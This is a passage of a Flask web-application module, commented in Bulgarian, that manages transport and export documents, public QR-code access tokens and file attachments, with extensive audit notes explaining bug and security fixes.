# -*- coding: utf-8 -*-
"""Списък/преглед/редакция/износ на документи, плюс издаването на петте
типа документи (ЧМР, опаковъчен лист, палетна карта, декларация за двойна
употреба, декларация за износ Италия).

Петте типа документи бяха по-рано пет почти идентични двойки *_new/*_preview
хендлъра в app.py. Тук са заменени с ДВЕ generic функции (_document_new,
_document_preview), управлявани от appcore.DOCUMENT_FLOWS (регистър с
разликите между типовете — виж appcore.py за подробности защо). Десетте
тънки wrapper-а по-долу (cmr_new, cmr_preview, packing_new, ...) пазят
ТОЧНО оригиналните endpoint имена и URL адреси, за да не се налага НИКАКВА
промяна в url_for(...) извикванията из 24-те Jinja шаблона."""
import io
import ipaddress
import json
import os
import sqlite3
from datetime import date, datetime, timedelta
from urllib.parse import urlsplit

from flask import (abort, flash, redirect, render_template, request, send_file,
                   session, url_for)
from flask_babel import gettext as _
from openpyxl.cell.cell import ILLEGAL_CHARACTERS_RE

import applog
import attachments
import client_export
import db
import invoice_clients_module
import net
import pdf_export
import qr_code
import remote_tunnel
from appcore import (CLIENT_EMBED_LIMIT, DOCUMENT_FLOWS, PRINT_TEMPLATES, _get_preview,
                     _parse_decimal, _store_preview, count_clients, packing_total_mismatches,
                     admin_required, clients_json, fetch_document, form_data,
                     fmt_num, format_bg_date, format_eur_amount, get_db, invoice_row_total,
                     invoice_row_weight, invoice_totals, load_clients, login_required,
                     negative_item_rows, paginate_documents, pallet_total_qty, parse_items,
                     public_token_expiry, PUBLIC_TOKEN_TTL_DAYS,
                     render_preview, safe_json_data, save_document,
                     suspicious_header_numbers, unparsable_item_rows)

# Одит (12.08.2026, находка №5): SQL израз за извличане на „името на
# клиента“ директно от JSON колоната `data` — СЪЩАТА логика (и същият
# приоритет: consignee_name → receiver_name → client_name) като преди
# прилаганата в Python СЛЕД пагинацията (виж documents() по-долу за пълния
# разказ защо това беше грешно). json_extract е част от вградения в
# SQLite JSON1 extension (стандартно наличен в Python 3.11's sqlite3).
#
# Одит (16.08.2026, находка №2, регресия от находка №5): json_extract()
# хвърля sqlite3.OperationalError ("malformed JSON") при ред с невалиден
# JSON в `data` — потвърдено с изпълнение. Без групиране такъв ред минава
# нормално (safe_json_data() го поглъща на Python ниво), но „Групирай по
# клиент“ гърмеше ЦЕЛИЯ списък заради ЕДИН такъв ред — иронично, точно
# класът срив, заради който съществува safe_json_data (находка К2).
# `json_valid(d.data)` пазачът връща NULL вместо да гърми за такива редове
# (третират се като „без разпознато име на клиент“ — падат накрая на
# списъка, както празно име, вместо да събарят цялата страница).
_CLIENT_NAME_SQL = (
    "COALESCE("
    "NULLIF(TRIM(CASE WHEN json_valid(d.data) THEN json_extract(d.data,'$.consignee_name') END),''),"
    "NULLIF(TRIM(CASE WHEN json_valid(d.data) THEN json_extract(d.data,'$.receiver_name') END),''),"
    "NULLIF(TRIM(CASE WHEN json_valid(d.data) THEN json_extract(d.data,'$.client_name') END),''),"
    "'')"
)

FORM_TEMPLATES = {k: v["form_template"] for k, v in DOCUMENT_FLOWS.items()}


def register(app):
    app.add_url_rule("/docs", "documents", documents)
    app.add_url_rule("/doc/<int:doc_id>", "view_document", view_document)
    # Публичен, БЕЗ вход преглед през QR код на бланката (заявка: „всеки,
    # който сканира с телефон баркода..., без да има нужда от домейна,
    # който е в програмата“) — нарочно ИЗВЪН /doc/<int:doc_id>, за да не се
    # разчита на предвидимо поредно ID; виж public_document_view по-долу.
    app.add_url_rule("/p/<token>", "public_document_view", public_document_view)
    # Одит (22.08.2026, находка №8): подновяване/отнемане на публичния QR
    # достъп. POST (променят състояние, CSRF от base формата), @login_required —
    # достъпът е фирмен, всеки служител, който вижда документа, трябва да
    # може да „загаси“ изтекъл линк или да спре разпространен такъв.
    app.add_url_rule("/doc/<int:doc_id>/public-link/renew", "public_link_renew",
                     public_link_renew, methods=["POST"])
    app.add_url_rule("/doc/<int:doc_id>/public-link/revoke", "public_link_revoke",
                     public_link_revoke, methods=["POST"])
    app.add_url_rule("/doc/<int:doc_id>/edit", "edit_document", edit_document, methods=["GET", "POST"])
    app.add_url_rule("/doc/<int:doc_id>/export.xlsx", "export_document_xlsx", export_document_xlsx)
    app.add_url_rule("/doc/<int:doc_id>/export.pdf", "export_document_pdf", export_document_pdf)
    app.add_url_rule("/doc/<int:doc_id>/delete", "delete_document", delete_document, methods=["POST"])
    app.add_url_rule("/doc/<int:doc_id>/attachments", "document_attachment_upload",
                     document_attachment_upload, methods=["POST"])
    app.add_url_rule("/doc/<int:doc_id>/attachments/<int:attachment_id>",
                     "document_attachment_view", document_attachment_view)
    app.add_url_rule("/doc/<int:doc_id>/attachments/<int:attachment_id>/delete",
                     "document_attachment_delete", document_attachment_delete,
                     methods=["POST"])

    app.add_url_rule("/cmr/new", "cmr_new", cmr_new, methods=["GET", "POST"])
    app.add_url_rule("/cmr/preview", "cmr_preview", cmr_preview, methods=["POST"])
    app.add_url_rule("/packing/new", "packing_new", packing_new, methods=["GET", "POST"])
    app.add_url_rule("/packing/preview", "packing_preview", packing_preview, methods=["POST"])
    app.add_url_rule("/pallet/new", "pallet_new", pallet_new, methods=["GET", "POST"])
    app.add_url_rule("/pallet/preview", "pallet_preview", pallet_preview, methods=["POST"])
    app.add_url_rule("/waybill/new", "waybill_new", waybill_new, methods=["GET", "POST"])
    app.add_url_rule("/waybill/preview", "waybill_preview", waybill_preview, methods=["POST"])
    app.add_url_rule("/dualuse/new", "dualuse_new", dualuse_new, methods=["GET", "POST"])
    app.add_url_rule("/dualuse/preview", "dualuse_preview", dualuse_preview, methods=["POST"])
    app.add_url_rule("/export-it/new", "export_it_new", export_it_new, methods=["GET", "POST"])
    app.add_url_rule("/export-it/preview", "export_it_preview", export_it_preview, methods=["POST"])


# ---------------------------------------------------------------- списък/преглед/редакция

#: Одит (находка В15, висок риск): списъкът с документи/фактури четеше
#: фиксирано "ORDER BY d.id DESC LIMIT 300" БЕЗ никаква пагинация в
#: интерфейса — документ №301 (и всеки по-стар) ставаше практически
#: невидим/ненамираем през тези екрани (освен с изричен филтър, изкарващ
#: го под 300-те), тих таван без предупреждение. Заменено с истинска
#: пагинация — вижте documents()/routes_invoices.invoices_list() по-долу.
PAGE_SIZE = 100


@login_required
def documents():
    doc_type = request.args.get("type", "")
    # Одит (03.09.2026, находка №9): непознат тип се НУЛИРА веднага, не само
    # за SQL филтъра. Шаблонът прави `doc_types[sel_type].title` — суровата
    # стойност от адреса стигаше дотам и вдигаше UndefinedError, тоест
    # анонимно съставим линк (/docs?type=') гарантирано сваляше 500-ка и
    # задействаше пренасочването по Referer (виж и поправката в appcore).
    if doc_type not in db.DOC_TYPES:
        doc_type = ""
    query = request.args.get("q", "").strip()
    group_by_client = request.args.get("group") == "client"
    page = request.args.get("page", 1, type=int) or 1
    # Филтър по диапазон от дати (заявка: подобрения по списъка с
    # документи) — по d.created_at (винаги попълнена автоматично при
    # издаване, виж db.py SCHEMA), не по doc_date от свободните данни на
    # документа (то е свободен текст, попълван ръчно, невинаги налично за
    # всички типове документи). date_from/date_to идват от <input
    # type="date"> (YYYY-MM-DD).
    #
    # Одит (16.08.2026, находка №22, дребна): преди тази поправка тук
    # стоеше `date(d.created_at) >= date(?)`/`<= date(?)` — обвиването на
    # САМАТА КОЛОНА (не параметъра) в `date(...)` прави израза НЕ-sargable
    # (виж СЪЩИЯ разказ в routes_dashboard._dashboard_stats и
    # db._m008_documents_created_at_index) — SQLite не може да ползва
    # индекс по created_at, ако трябва да изчисли функция върху колоната
    # за ВСЕКИ ред. created_at е ВИНАГИ "YYYY-MM-DD HH:MM:SS" (db.py
    # SCHEMA DEFAULT) — лексикографското сравнение directno върху текста
    # дава ТОЧНО СЪЩИЯ резултат за долната граница (>=), а горната (<=,
    # трябва да покрие ЦЕЛИЯ ден на date_to) минава през полуотворен
    # интервал: created_at < date(date_to, '+1 day') — date() тук
    # обвива ПАРАМЕТЪРА, не колоната, затова остава sargable.
    date_from = request.args.get("from", "").strip()
    date_to = request.args.get("to", "").strip()
    # Фактурите НЕ се показват тук — те имат собствен списък в раздел
    # „Фактури“ (заявка: „само там да се появяват издадените фактури“).
    # Виж db.INVOICE_DOC_TYPES.
    where = ("WHERE d.doc_type NOT IN (%s)"
            % ",".join("?" for _ in db.INVOICE_DOC_TYPES))  # nosec B608 -- само „?“ плейсхолдъри по брой; стойностите са bound параметри
    params = list(db.INVOICE_DOC_TYPES)
    if doc_type in db.DOC_TYPES and doc_type not in db.INVOICE_DOC_TYPES:
        where += " AND d.doc_type = ?"
        params.append(doc_type)
    if query:
        # В7: ci_contains (db._ci_contains) сгъва регистъра с Python
        # str.lower() (правилно за кирилица), за разлика от LIKE тук.
        where += " AND (ci_contains(d.number, ?) OR ci_contains(d.barcode, ?) OR ci_contains(d.data, ?))"
        params += [query, query, query]
    if date_from:
        where += " AND d.created_at >= ?"
        params.append(date_from)
    if date_to:
        where += " AND d.created_at < date(?, '+1 day')"
        params.append(date_to)
    con = get_db()
    # Групиране по клиент (заявка: „всеки клиент да се запазват в отделни
    # папки във всички документи“ — тук е UI-групирането, виж
    # client_export.py за реалните папки на диска).
    #
    # Одит (12.08.2026, находка №5, critical): преди тази поправка
    # сортирането по клиент се правеше в Python СЛЕД като SQL заявката
    # вече беше взела само PAGE_SIZE=100 документа (LIMIT/OFFSET) — при
    # филтър с над 100 документа групирането важеше САМО в рамките на
    # текущата страница; документи на един и същ клиент, разпределени на
    # различни страници, изобщо не се събираха заедно — самата цел на
    # функцията отпадаше точно при активна фирма с много документи. Сега
    # сортирането (СЪЩАТА логика — вижте _CLIENT_NAME_SQL по-горе, същия
    # приоритет consignee_name → receiver_name → client_name, празно име
    # накрая) е част от самата SQL заявка, ПРЕДИ LIMIT/OFFSET — пагинацията
    # вече обхожда СОРТИРАНИЯ по клиент резултат, страница по страница,
    # точно както при подредба по номер.
    order_by = "d.id DESC"
    if group_by_client:
        # Одит (16.08.2026, находка №15): ci_lower (db._ci_lower) вместо
        # вграденото LOWER() — вижте db._ci_lower за пълното обяснение
        # защо LOWER() не сгъва кирилица.
        #
        # Одит (05.09.2026, находка №11): сортира се по ПОСТОЯННАТА колона
        # `d.client_name` (db._m011), не по изваждане от JSON-а. Досега
        # изразът стоеше в ORDER BY ТРИ пъти, всяко копие правеше
        # `json_valid` + до три `json_extract` върху цялото тяло на всеки
        # документ, а после temp B-tree сортираше целия резултат — за 100
        # реда. Измерено при 20 000 документа: 441 ms и 170 MB прочетени.
        order_by = ("(d.client_name = '') ASC, ci_lower(d.client_name) ASC,"
                    " d.client_name ASC, d.id DESC")
    docs, page, total_pages, total_count = paginate_documents(
        con, where, params, page, page_size=PAGE_SIZE, order_by=order_by)
    metas = [safe_json_data(d["data"]) for d in docs]
    return render_template("documents.html", docs=docs, metas=metas,
                           doc_types=db.DOC_TYPES, sel_type=doc_type, q=query,
                           group_by_client=group_by_client,
                           date_from=date_from, date_to=date_to,
                           page=page, total_pages=total_pages, total_count=total_count)


def _host_is_local_or_private(hostname):
    """Дали адрес с този host би бил достъпен САМО от този компютър или
    само от локалната мрежа (не от телефон на мобилен интернет)."""
    if not hostname or hostname == "localhost":
        return True
    try:
        ip = ipaddress.ip_address(hostname)
    except ValueError:
        return False  # истинско домейн име (напр. *.trycloudflare.com) → публично
    return ip.is_loopback or ip.is_private or ip.is_link_local


def _public_doc_url(token, for_print=False):
    """(адрес за QR кода, дали е само локален) — избира НАЙ-ДОСТЪПНИЯ
    ОТВЪН адрес, а не буквално този, от който операторът гледа страницата.

    Поправка на реален проблем (заявка: „QR кодът не показва документа —
    поправи всеки да го вижда“): преди тук се вземаше request.host_url
    дословно, а на инсталираната програма той е http://127.0.0.1:5000 —
    адрес, който на телефона сочи САМИЯ телефон, не компютъра със
    сървъра, затова сканираният QR не отваряше нищо. Редът на избор:

    1. Активен „Отдалечен достъп“ (Cloudflare тунел, виж remote_tunnel.py)
       → неговият публичен https адрес: работи от ВСЯКА мрежа, включително
       мобилен интернет — точно „всеки да го вижда“.
    2. Иначе, ако страницата се гледа през 127.0.0.1/localhost → същият
       порт, но с истинския IP адрес на компютъра в локалната мрежа
       (net.lan_ip): работи от телефони в офисната Wi-Fi мрежа (при
       включен „Мрежов режим“).
    3. Иначе (вече се гледа през LAN IP или собствен домейн) → адресът
       се ползва както е — той вече е най-доброто известно.

    Вторият елемент от резултата (True при локален/частен адрес) кара
    изгледа на оператора да покаже подсказка как да включи достъп
    отвсякъде — само на екрана, не на печатната бланка.

    НАРОЧНО без @login_required — извиква се и от view_document (с вход)
    И от public_document_view (без вход, виж по-долу); decorator тук би
    развалил точно втория случай (би връщал пренасочване към /login
    вместо адрес, вграждан после в QR картинката)."""
    path = url_for("public_document_view", token=token)

    # Одит (19.08.2026, находка №21, средна): тунелният адрес е ЕФИМЕРЕН —
    # `*.trycloudflare.com` поддомейнът е случаен, тунелът се самоспира
    # след 2 часа (виж remote_tunnel._AUTO_STOP_SECONDS), а Cloudflare
    # преизползва тези поддомейни за ЧУЖДИ тунели. Вграден в ХАРТИЕНА
    # бланка, той е бомба със закъснител: шофьор или митничар, сканиращ
    # товарителницата седмица по-късно, попада на нечий чужд сървър —
    # идеална основа за фалшив документ с вида на нашия. Затова тунелният
    # адрес важи само за ЕКРАНА (for_print=False); печатната бланка носи
    # стабилния локален/мрежов адрес, който поне не сочи към непознат.
    # Одит (22.08.2026, находка №2): ПОСТОЯНЕН публичен адрес, ако е зададен.
    #
    # Поправката на №21 (19.08) правилно махна ефимерния trycloudflare адрес
    # от печатната бланка, но не постави НИЩО на негово място — бланката
    # тръгна да носи LAN адрес (безполезен извън офиса), а без LAN изобщо —
    # `127.0.0.1`, тоест ТОЧНО първоначалният дефект, заради който тази
    # функция съществува („на телефона сочи самия телефон“). Затова тук идва
    # изрично настройваният в „Системни настройки“ постоянен адрес (собствен
    # домейн или named tunnel): той НЕ изтича и НЕ се преизползва от чужд
    # тунел, значи е единственият, който има работа върху хартия.
    configured = (db.get_settings(get_db()).get("public_base_url") or "").strip()
    if configured:
        return configured.rstrip("/") + path, False

    if not for_print:
        tunnel = remote_tunnel.status()
        if tunnel.get("status") == "running" and tunnel.get("url"):
            return tunnel["url"].rstrip("/") + path, False

    parts = urlsplit(request.host_url)
    hostname = parts.hostname or ""
    if hostname in ("localhost", "127.0.0.1", "::1"):
        lan = net.lan_ip()
        if lan:
            hostname = lan
    netloc = hostname + (":%d" % parts.port if parts.port else "")
    return "%s://%s%s" % (parts.scheme, netloc, path), _host_is_local_or_private(hostname)


def _public_doc_context(row, for_print=False):
    """(public_url, qr_data_uri, local_hint) за документа, или
    (None, None, False), ако документният тип няма публичен QR (фактури —
    по изричен избор на потребителя: „само документите с баркод вече“) или
    документът все още няма public_token (защитна проверка — не би
    трябвало да се случи след db._m002_public_token, всеки запис минава
    през миграцията при старт)."""
    if row["doc_type"] in db.INVOICE_DOC_TYPES or not row["public_token"]:
        return None, None, False
    url, local = _public_doc_url(row["public_token"], for_print=for_print)
    return url, qr_code.qr_png_data_uri(url), local


@login_required
def view_document(doc_id):
    con = get_db()
    row, data = fetch_document(con, doc_id)
    # Одит (12.08.2026, находка №21): "or 1" НЕ хваща отрицателни стойности
    # (-1 е истинно в Python, "-1 or 1" си остава -1) — ?copies=-1 минаваше
    # без грешка и даваше `range(-1)` в шаблона (празна страница за печат,
    # без никакво съобщение защо). Сега изрично се отхвърля всичко < 1.
    copies = request.args.get("copies", type=int) or 1
    if copies < 1:
        copies = 1
    label_format = request.args.get("format") == "label"
    # Одит (19.08.2026, находка №21): for_print=True — в QR кода влиза
    # СТАБИЛНИЯТ адрес, защото тази страница Е печатната бланка. Временният
    # публичен адрес на тунела се показва отделно, само на екрана.
    public_url, qr_data_uri, qr_local_hint = _public_doc_context(row, for_print=True)
    # Одит (22.08.2026, находка №2): вярно, когато печатният QR носи локален
    # адрес — тогава показваме на екрана (не на бланката) как да се оправи.
    print_qr_is_local = bool(public_url) and qr_local_hint
    remote_public_url = None
    if public_url:
        tunnel = remote_tunnel.status()
        if tunnel.get("status") == "running" and tunnel.get("url"):
            remote_public_url = tunnel["url"].rstrip("/") + url_for(
                "public_document_view", token=row["public_token"])
            # Подсказката „включете Отдалечен достъп“ няма смисъл, когато
            # той ВЕЧЕ е включен — на нейно място показваме самия временен
            # публичен адрес (виж _macros.doc_qr).
            qr_local_hint = False
    # Одит (22.08.2026, находка №8, средна): срокът на публичния достъп
    # вече се ВИЖДА. Дотук колоната се попълваше при издаване и после
    # никой (нито код, нито интерфейс) не я четеше — операторът нямаше как
    # да разбере, че QR кодът на бланката ще спре да работи, нито кога.
    public_expires_at = row["public_token_expires_at"] if public_url else None
    public_expired = db.public_token_is_expired(public_expires_at)
    return render_template(PRINT_TEMPLATES[row["doc_type"]], doc=row, d=data,
                           copies=min(copies, 5), preview=False,
                           label_format=label_format,
                           doc_attachments=attachments.list_attachments(con, doc_id),
                           remote_public_url=remote_public_url,
                           print_qr_is_local=print_qr_is_local,
                           public_expires_at=public_expires_at,
                           public_expired=public_expired,
                           public_ttl_days=PUBLIC_TOKEN_TTL_DAYS,
                           public_url=public_url, qr_data_uri=qr_data_uri,
                           qr_local_hint=qr_local_hint, edit_doc_id=None)


def _public_link_doc(con, doc_id):
    """Ред от `documents` за подновяване/отнемане на публичния достъп, или
    404. Отделно от fetch_document (което сглобява и данните за показване)
    — тук трябват само типът и токенът."""
    row = con.execute(
        "SELECT id, doc_type, number, public_token, public_token_expires_at"
        " FROM documents WHERE id = ?", (doc_id,)).fetchone()
    if row is None:
        abort(404)
    return row


@login_required
def public_link_renew(doc_id):
    """Одит (22.08.2026, находка №8): „Поднови за още %d дни“.

    Реалният сценарий: рекламация или митническа проверка месеци след
    доставката. Насрещната страна сканира QR кода от архивното копие на
    бланката и получава страницата „линкът е изтекъл“; операторът отваря
    документа в програмата и с ЕДИН бутон връща достъпа, вместо да
    преиздава документа (което би му дало НОВ номер — недопустимо за вече
    подписан транспортен документ)."""
    con = get_db()
    row = _public_link_doc(con, doc_id)
    new_expiry = public_token_expiry()
    con.execute("UPDATE documents SET public_token_expires_at = ? WHERE id = ?",
                (new_expiry, doc_id))
    con.commit()
    applog.log_audit("подновен публичен достъп до документ",
                     "id=%s %s №%s до %s"
                     % (doc_id, row["doc_type"], row["number"], new_expiry))
    flash(_("Публичният достъп е подновен до %(until)s.")
          % {"until": format_bg_date(new_expiry)}, "success")
    return redirect(url_for("view_document", doc_id=doc_id))


@login_required
def public_link_revoke(doc_id):
    """Одит (22.08.2026, находка №8): „Отнеми достъпа сега“.

    Точно това беше заявено от находка №20 (19.08) и точно това НЕ беше
    доставено: колоната се попълваше при издаване и повече никой не я
    пипаше. Сценарият е бланка, попаднала у когото не трябва (сгрешен
    получател, снимка на документа, напуснал шофьор) — достъпът трябва да
    спре ВЕДНАГА, без да се трие самият документ.

    Срокът се измества с една секунда в МИНАЛОТО (а не се занулява):
    NULL в тази колона означава „безсрочен“, тоест зануляването би било
    точно обратното на исканото."""
    con = get_db()
    row = _public_link_doc(con, doc_id)
    revoked_at = (datetime.now() - timedelta(seconds=1)).strftime("%Y-%m-%d %H:%M:%S")
    con.execute("UPDATE documents SET public_token_expires_at = ? WHERE id = ?",
                (revoked_at, doc_id))
    con.commit()
    applog.log_audit("отнет публичен достъп до документ",
                     "id=%s %s №%s" % (doc_id, row["doc_type"], row["number"]))
    flash(_("Публичният достъп е отнет — QR кодът на бланката вече не отваря "
            "документа."), "success")
    return redirect(url_for("view_document", doc_id=doc_id))


def public_document_view(token):
    """Публичен преглед на документ БЕЗ вход, през QR кода на бланката —
    заявка: „всеки, който сканира с телефон баркода на някой от
    документите, да му се зареди директно документа, без да има нужда от
    домейна, който е в програмата“ + уточнение „само документа, нищо друго
    да не вижда“ (виж templates/base.html — public_view=True кара базовия
    шаблон да пропусне страничната лента/навигация/скенер формите изцяло,
    дори ако браузърът случайно вече има активна сесия).

    НАРОЧНО без @login_required/@admin_required — целият смисъл на
    заявката е точно обратното на изискване за вход. Защитата тук е
    ЕДИНСТВЕНО непредвидимостта на token (128-битов, виж
    db._m002_public_token) — за разлика от `barcode` (предвидим формат
    ТИП-ДДММГГГГ-####, лесен за изброяване), token не издава нищо за кой
    да е ДРУГ документ в базата, дори на човек, който познае модела.

    Непознат token ИЛИ токен на фактура (изрично изключени от заявката)
    връща обикновено 404 — не пренасочва към вход, това би издало, че
    адресът просто е "чужд", вместо "невалиден"."""
    con = get_db()
    # Одит (22.08.2026, находка №8, средна): непознат и ИЗТЕКЪЛ токен вече
    # НЕ са едно и също. Дотук и двата даваха гол 404 — човек, сканирал
    # архивна бланка при рекламация/митническа проверка шест месеца
    # по-късно, виждаше „не е намерено“ и нямаше как да се досети, че
    # трябва просто да поиска нов линк. Непознатият токен си остава 404
    # (не издаваме нищо за чужди адреси), а изтеклият получава обяснение —
    # БЕЗ никакви данни от документа (виж public_link_expired.html).
    status, doc_id = db.get_public_token_status(con, token)
    if status == db.PUBLIC_TOKEN_MISSING:
        abort(404)
    row, data = fetch_document(con, doc_id)
    if row["doc_type"] in db.INVOICE_DOC_TYPES:
        abort(404)
    if status == db.PUBLIC_TOKEN_EXPIRED:
        # 410 Gone, не 404: ресурсът Е СЪЩЕСТВУВАЛ на този адрес и е
        # премахнат нарочно — точното значение на кода.
        return render_template("public_link_expired.html", public_view=True), 410
    public_url, qr_data_uri, _local = _public_doc_context(row, for_print=True)
    return render_template(PRINT_TEMPLATES[row["doc_type"]], doc=row, d=data,
                           copies=1, preview=False, label_format=False,
                           doc_attachments=[], public_url=public_url,
                           # Подсказката за локален адрес е за ОПЕРАТОРА
                           # (как да включи достъп отвсякъде) — на човека,
                           # който вече е отворил документа през телефона
                           # си, тя не говори нищо.
                           qr_data_uri=qr_data_uri, qr_local_hint=False,
                           public_view=True, edit_doc_id=None)


@login_required
def document_attachment_upload(doc_id):
    con = get_db()
    fetch_document(con, doc_id)  # 404, ако документът не съществува
    file = request.files.get("attachment")
    if not file or not file.filename:
        flash(_("Моля, изберете файл (снимка или PDF)."), "error")
        return redirect(url_for("view_document", doc_id=doc_id))
    try:
        attachments.save_attachment(con, doc_id, file, uploaded_by=session["user_id"])
        flash(_("Файлът е прикачен към документа."), "success")
    except ValueError as exc:
        flash(_("Файлът не бе приет: %s") % exc, "error")
    return redirect(url_for("view_document", doc_id=doc_id))


@login_required
def document_attachment_view(doc_id, attachment_id):
    con = get_db()
    fetch_document(con, doc_id)  # 404, ако документът не съществува
    row = attachments.get_attachment(con, doc_id, attachment_id)
    if row is None:
        abort(404)
    path = attachments.attachment_path(doc_id, row)
    if not os.path.exists(path):
        abort(404)
    # Одит (19.08.2026, находка №18, средна): PDF-ите се СВАЛЯТ, не се
    # отварят вградено. Магическите байтове („%PDF-“) доказват, че файлът е
    # PDF, но НЕ че е безобиден скан: PDF с `/OpenAction /JavaScript` или
    # вграден фишинг формуляр минава проверката и — при `as_attachment=False`
    # + `Content-Type: application/pdf` — се отваря в четеца на браузъра
    # В СОБСТВЕНИЯ origin на приложението, с активната сесия на оператора.
    # Всеки логнат служител може да прикачи такъв файл към кой да е
    # документ. Снимките (png/jpg/gif) остават вградени — там няма активно
    # съдържание, а прегледът им на място е реалната причина функцията да
    # съществува.
    inline = row["ext"] != "pdf"
    resp = send_file(path, mimetype=attachments.mimetype(row["ext"]),
                     download_name=row["filename"], as_attachment=not inline)
    # Втора линия: изрично забранява изпълнението на каквото и да е активно
    # съдържание от този отговор, независимо от типа му.
    resp.headers["Content-Security-Policy"] = "sandbox; default-src 'none'"
    return resp


@admin_required
def document_attachment_delete(doc_id, attachment_id):
    con = get_db()
    fetch_document(con, doc_id)  # 404, ако документът не съществува
    if attachments.delete_attachment(con, doc_id, attachment_id):
        flash(_("Прикаченият файл е изтрит."), "success")
    else:
        flash(_("Файлът вече не съществува."), "warning")
    return redirect(url_for("view_document", doc_id=doc_id))


@login_required
def edit_document(doc_id):
    """Редакция на вече издаден документ — номерът, баркодът, годината и
    поредността се пазят непроменени (не се преиздава нов номер); само
    съдържанието (data) се обновява. Ползва СЪЩИТЕ форми, както при
    издаване, предварително попълнени с текущите стойности."""
    con = get_db()
    row, data = fetch_document(con, doc_id)
    doc_type = row["doc_type"]
    if doc_type not in FORM_TEMPLATES:
        abort(404)

    if request.method == "POST":
        # Одит (16.08.2026, находка №39): оптимистично заключване — вижте
        # db._m006_document_version за пълното обяснение. Формата носи
        # версията от МОМЕНТА НА ЗАРЕЖДАНЕТО си (edit_doc_version, скрито
        # поле); ако вече не съвпада с текущата версия в базата, значи друг
        # потребител (или друг таб/устройство на същия) е записал междинна
        # редакция — спираме тук, вместо тихо да я презапишем.
        submitted_version = (request.form.get("edit_doc_version") or "").strip()
        current_version = row["version"] if "version" in row.keys() else 1
        _conflict_msg = _("Документът е бил редактиран от друг потребител междувременно "
                          "(докато тази форма е била отворена) — за да не презапишете "
                          "случайно неговите промени, страницата е презаредена с "
                          "актуалните данни. Приложете промените си наново.")
        # Одит (19.08.2026, находка №10, висока — fail-closed): преди това
        # условието беше `if submitted_version.isdigit() and ...`, тоест при
        # ЛИПСВАЩО или нечислово поле проверката просто се ПРОПУСКАШЕ и
        # записът минаваше. Проверено с изпълнение: POST без
        # `edit_doc_version` презаписваше документа безшумно. `WHERE version
        # = ?` в самия UPDATE по-долу не помага — стойността се чете в
        # СЪЩАТА заявка секунди преди UPDATE-а, така че винаги съвпада.
        # Защита, която се изключва сама при липсващо поле, не е защита:
        # сега липсата се третира като конфликт (формата се презарежда с
        # актуалните данни и валидна версия).
        if not submitted_version.isdigit() or int(submitted_version) != current_version:
            flash(_conflict_msg, "error")
            # Одит (03.09.2026, находка №15): и конфликтният изход пази
            # въведеното. Защитата работеше правилно (чуждата редакция не се
            # презаписва), но формата се връщаше ПРАЗНА — при фактура с 200
            # реда това е преписване наново. Съседният `IntegrityError` клон
            # ползва точно този механизъм от 31.08; тук просто не беше
            # приложен. Версията е ТЕКУЩАТА от базата, за да може вторият
            # опит да мине.
            #
            # Одит (05.09.2026, находка №1, ВИСОКА — РЕГРЕСИЯ от горното):
            # `form_data()` изрично ИЗКЛЮЧВА `items_json`; редовете идват
            # само през `parse_items()`. Тоест поправката отгоре пазеше само
            # заглавните полета, а при GET с `?restore=` подаденото ЗАМЕСТВА
            # изцяло данните от базата — формата се рендираше с ПРАЗНА
            # таблица (нито въведените редове, нито съществуващите), докато
            # съобщението твърди „презаредена с актуалните данни“. Оператор,
            # който натисне „Запази“ втори път, ЗАНУЛЯВАШЕ редовете на вече
            # издаден документ. Преди поправката от 03.09 конфликтът просто
            # пренасочваше и редовете си стояха — тоест бях направил нещата
            # ПО-ЛОШИ. Проверено с изпълнение: `items: []` в базата.
            #
            # Сега се пази същото, което пази огледалният клон по-долу:
            # заглавните полета И редовете (плюс `items_format`, който също
            # не идва от `form_data`).
            conflict_data = form_data()
            if DOCUMENT_FLOWS[doc_type]["needs_items"]:
                conflict_data["items"] = parse_items()
                if "items_format" in data:
                    conflict_data["items_format"] = data["items_format"]
            token = _store_preview("doc", (doc_type, conflict_data, doc_id,
                                           current_version))
            return redirect("%s?restore=%s"
                            % (url_for("edit_document", doc_id=doc_id), token))
        new_data = form_data()
        # Одит (16.08.2026, находка №37): формите не пресъздават ВИНАГИ
        # всяко поле, което документът може да носи в data (напр. поле от
        # по-стара версия на формата, вече премахнато от шаблона, или поле,
        # попълвано само от друг код път като импорт от Excel/палетна
        # карта) — преди тази поправка new_data = form_data() ЗАМЕСТВАШЕ
        # изцяло старото data, и всяко такова „чуждо“ поле тихо изчезваше
        # при първата редакция. Сега тръгваме от старите данни и само
        # ПРЕЗАПИСВАМЕ с подадените от формата полета — полета извън
        # формата се запазват непроменени.
        merged = dict(data)
        merged.update(new_data)
        new_data = merged
        # Кои типове имат редове артикули идва от DOCUMENT_FLOWS (същия
        # регистър, който управлява и издаването), а НЕ от изброен тук
        # списък — при добавяне на нов тип с редове (напр. фактурите)
        # изброеният списък се пропускаше лесно и редовете тихо изчезваха
        # при редакция на вече издаден документ.
        if DOCUMENT_FLOWS[doc_type]["needs_items"]:
            new_data["items"] = parse_items()
            if "items_format" in data:
                new_data["items_format"] = data["items_format"]
            # Одит (16.08.2026, находка №32): _warn_if_negative_values се
            # викаше само при ПЪРВОНАЧАЛНОТО издаване (_document_new) — при
            # редакция на вече издаден документ отрицателен ред минаваше
            # без никакво предупреждение, макар пак да изчезва мълчаливо от
            # сборовете под таблицата (виж appcore.negative_item_rows).
            _warn_if_negative_values(new_data["items"])
            if doc_type == "packing":
                _warn_if_packing_totals_mismatch(new_data)  # находка №8
        # Одит (03.09.2026, находка №6): заглавните числа се проверяват за
        # ВСИЧКИ типове — и за тези без редове (ЧМР), и при редакция.
        _warn_if_suspicious_header_numbers(doc_type, new_data)
        # Баркодът винаги се пази от оригинала — редакцията не преиздава
        # нов. Номерът също, С ИЗКЛЮЧЕНИЕ на типовете с РЪЧЕН номер
        # (фактурите): там номерът е въведен от оператора и трябва да може
        # да се поправи при редакция, иначе сгрешен номер остава завинаги.
        number = row["number"]
        manual_field = DOCUMENT_FLOWS[doc_type]["manual_number_field"]
        if manual_field:
            typed = (new_data.get(manual_field) or "").strip()
            if typed and typed != number:
                # Одит (31.08.2026, находка №20): годината на САМИЯ документ,
                # не текущата — виж помощната функция.
                _warn_if_number_already_used(con, doc_type, typed,
                                             year=row["year"],
                                             exclude_doc_id=doc_id)
                number = typed
            _warn_if_mixed_orders(new_data.get("items"))
        new_data["number"] = number
        new_data["barcode"] = row["barcode"]
        try:
            # Одит (16.08.2026, находка №39): "WHERE ... AND version = ?" +
            # проверка на rowcount затваря и тясната междина между проверката
            # по-горе и самия UPDATE (два почти едновременни submit-а) — не
